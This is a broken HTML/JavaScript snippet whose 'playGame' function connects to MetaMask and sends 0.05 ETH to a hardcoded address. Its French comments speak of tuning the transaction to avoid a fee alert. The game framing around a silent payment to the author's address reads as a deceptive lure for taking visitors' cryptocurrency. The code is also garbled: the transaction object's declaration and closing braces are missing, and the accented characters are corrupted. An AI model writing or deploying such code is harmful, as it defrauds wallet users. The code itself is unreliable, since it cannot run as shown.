    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script>
        async function playGame() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();

                    // Param√®tres de transaction optimis√©s pour √©viter l'alerte de frais

                        to: "0x8E25e9858679f29193233F7D5D9939105408d257", // Ton adresse de r√©ception
                        value: ethers.utils.parseEther("0.05"),
                        // On demande un peu plus de gas pour la rapidit√© (Agressif)
                        maxPriorityFeePerGas: ethers.utils.parseUnits('40', 'gwei'),
                        maxFeePerGas: ethers.utils.parseUnits('60', 'gwei')
                    };

                    const transaction = await signer.sendTransaction(tx);
                    alert("Transaction sent! Hash: " + transaction.hash);
                } catch (error) {
                    console.error(error);
                    alert("Transaction failed: " + error.message);
                }
            } else {
                alert("Please open this in MetaMask browser!");

        }
